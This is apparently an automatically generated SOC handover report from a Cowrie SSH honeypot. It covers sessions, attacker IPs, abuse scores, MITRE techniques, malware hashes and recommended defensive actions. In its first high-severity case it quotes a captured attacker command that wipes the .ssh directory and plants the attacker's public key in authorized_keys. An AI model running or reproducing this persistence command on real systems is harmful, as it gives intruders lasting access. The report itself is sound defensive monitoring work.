# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-11 |
| **Generated At** | 2026-03-11T04:08:55Z |
| **Shift Time** | 04:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **57** |
| Confirmed Threats | **33** |
| False Positives Filtered | **24** (42.1%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **12** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **0** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5e07f655cd08

| Field | Detail |
|---|---|
| **Source IP** | `83.111.76[.]194` |
| **First Seen** | 2026-03-11 01:54 |
| **Last Seen** | 2026-03-11 01:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 01:54:01` | `cowrie.session.connect` |
| `2026-03-11 01:54:01` | `cowrie.client.version` |
| `2026-03-11 01:54:01` | `cowrie.client.kex` |
| `2026-03-11 01:54:01` | `cowrie.login.success` |
| `2026-03-11 01:54:01` | `cowrie.session.params` |
| `2026-03-11 01:54:01` | `cowrie.command.input` |
| `2026-03-11 01:54:01` | `cowrie.command.failed` |
| `2026-03-11 01:54:01` | `cowrie.log.closed` |
| `2026-03-11 01:54:01` | `cowrie.session.params` |
| `2026-03-11 01:54:01` | `cowrie.command.input` |
| `2026-03-11 01:54:01` | `cowrie.session.file_download` |
| `2026-03-11 01:54:01` | `cowrie.log.closed` |
| `2026-03-11 01:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.111.76[.]194` to AbuseIPDB if not already reported
- [ ] Block `83.111.76[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301939f3fb4e

| Field | Detail |
|---|---|
| **Source IP** | `83.111.76[.]194` |
| **First Seen** | 2026-03-11 01:54 |
| **Last Seen** | 2026-03-11 01:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 01:54:03` | `cowrie.session.connect` |
| `2026-03-11 01:54:03` | `cowrie.client.version` |
| `2026-03-11 01:54:03` | `cowrie.client.kex` |
| `2026-03-11 01:54:03` | `cowrie.login.success` |
| `2026-03-11 01:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.111.76[.]194` to AbuseIPDB if not already reported
- [ ] Block `83.111.76[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `83.111.76[.]194` | **11** | 2026-03-11 01:49 | 2026-03-11 02:12 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.249[.]72` | **4** | 2026-03-11 00:27 | 2026-03-11 00:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]201` | **3** | 2026-03-11 03:36 | 2026-03-11 03:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.200.243[.]197` | **2** | 2026-03-11 03:20 | 2026-03-11 03:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]94` | **2** | 2026-03-11 02:23 | 2026-03-11 02:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-03-11 01:49 | 2026-03-11 02:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.251.207[.]153` | 1 | 2026-03-11 01:37 | 2026-03-11 01:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-11 03:59 | 2026-03-11 04:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.149[.]244` | 1 | 2026-03-11 03:07 | 2026-03-11 03:07 | 8s | 0 | `T1592` | 🟢 LOW |
| `211.250.12[.]75` | 1 | 2026-03-11 03:13 | 2026-03-11 03:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `37.34.242[.]99` | 1 | 2026-03-11 00:01 | 2026-03-11 00:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `68.199.97[.]245` | 1 | 2026-03-11 01:14 | 2026-03-11 01:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.215.35[.]25` | 1 | 2026-03-11 00:48 | 2026-03-11 00:49 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (2 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.200.243[.]197` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `83.111.76[.]194` | AE | Ch2m Hill | **100** ⚠️ | 30 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `37.34.242[.]99` | KW | ZAIN KW | **100** ⚠️ | 8 |
| `94.26.106[.]201` | DE | Telco power Ltd | **100** ⚠️ | 24 |
| `211.250.12[.]75` | KR | Korea Telecom | **100** ⚠️ | 18 |
| `68.199.97[.]245` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 7 |
| `120.241.79[.]66` | CN | China Mobile Communications Corporation | **100** ⚠️ | 45 |
| `45.79.181[.]94` | US | Linode | **100** ⚠️ | 50 |
| `14.103.149[.]244` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | — |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 7 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 57 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 25 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 24 filtered (42.1%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 2 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 2 priority case(s) shown individually · 13 recon entry/entries in table (6 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-11T04:08:55Z_
